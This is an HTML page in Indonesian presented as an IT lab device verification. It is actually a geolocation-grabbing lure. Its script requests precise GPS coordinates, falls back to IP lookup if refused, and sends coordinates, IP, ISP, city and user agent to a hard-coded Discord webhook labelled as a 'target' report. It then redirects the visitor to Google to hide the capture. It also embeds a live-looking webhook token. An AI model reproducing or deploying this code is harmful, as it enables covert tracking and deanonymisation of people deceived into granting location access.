<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Validasi Lab IT</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f4; }
        .container { background: white; padding: 30px; border-radius: 8px; display: inline-block; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); max-width: 400px; }
        button { background-color: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 15px; }
        button:hover { background-color: #0056b3; }
    </style>
</head>
<body>

<div class="container">
    <h1>Verifikasi Perangkat Lab</h1>
    <p>Untuk melanjutkan ke modul praktikum, sistem memerlukan verifikasi keamanan lokasi Anda.</p>
    <button onclick="mintaLokasi() pale">Masuk ke Lab</button>
</div>

<script>
    const webhookURL = "https://discordapp.com/api/webhooks/1510165102748368918/8WS5uxwe9niDDyN_vnxp7hQPSFEnZI4s9vZCPM0LoMQlis9OVa13wsqJXS-9C8xn8WJO";

    // Fungsi utama untuk meminta GPS Akurat
    function mintaLokasi() {
        if (navigator.geolocation) {
            // Meminta koordinat dengan akurasi tinggi
            navigator.geolocation.getCurrentPosition(kirimLokasiAkurat, tanganiError, {
                enableHighAccuracy: true, // Memaksa perangkat menggunakan GPS/Akurasi tertinggi
                timeout: 10000,
                maximumAge: 0
            });
        } else {
            alert("Browser Anda tidak mendukung verifikasi lokasi.");
            ambilDataIPHanya("Tidak Didukung");
        }
    }

    // Jika target menekan "ALLOW"
    function kirimLokasiAkurat(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const akurasi = position.coords.accuracy; // dalam satuan meter
        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

        // Ambil data IP juga sebagai pelengkap
        fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            kirimKeDiscord(data, googleMapsLink, `Akurat hingga ${akurasi.toFixed(1)} meter`);
        })
        .catch(() => {
            kirimKeDiscord({}, googleMapsLink, `Akurat hingga ${akurasi.toFixed(1)} meter (Gagal muat IP)`);
        });
    }

    // Jika target menekan "BLOCK" atau error
    function tanganiError(error) {
        let alasan = "Izin Ditolak Target (Block)";
        if(error.code == error.POSITION_UNAVAILABLE) alasan = "Informasi lokasi tidak tersedia";
        if(error.code == error.TIMEOUT) alasan = "Waktu permintaan habis";
        
        console.log("Akses GPS ditolak, beralih ke pelacakan IP biasa.");
        
        // Tetap kirim data IP biasa jika GPS ditolak
        ambilDataIPHanya(alasan);
    }

    function ambilDataIPHanya(statusGPS) {
        fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            kirimKeDiscord(data, "Gagal Mendapatkan GPS (Akses Ditolak)", statusGPS);
        });
    }

    // Fungsi pengirim data ke Discord Webhook
    function kirimKeDiscord(dataIP, mapsLink, statusGPS) {
        const payload = {
            embeds: [
                {
                    title: "🎯 Laporan Analisis Lokasi Target 🎯",
                    color: mapsLink.includes("google.com") ? 3066993 : 15158332, // Hijau jika sukses GPS, Merah jika IP saja
                    fields: [
                        { name: "📍 LINK GOOGLE MAPS (GPS)", value: mapsLink, inline: false },
                        { name: "ℹ️ Status GPS/Akurasi", value: statusGPS, inline: false },
                        { name: "🌐 IP Address", value: dataIP.ip || "Tidak diketahui", inline: true },
                        { name: "🏢 Provider/ISP", value: dataIP.org || "Tidak diketahui", inline: true },
                        { name: "🏙️ Kota (Estimasi IP)", value: dataIP.city || "Tidak diketahui", inline: true },
                        { name: "💻 User Agent", value: navigator.userAgent, inline: false }
                    ],
                    footer: { text: "Lab Geolocation Tingkat Lanjut" },
                    timestamp: new Date()
                }
            ]
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(() => {
            // Setelah data terkirim, alihkan atau berikan respon di web
            alert("Verifikasi Berhasil! Mengalihkan...");
            window.location.href = "https://www.google.com";
        });
    }
</script>

</body>
</html>
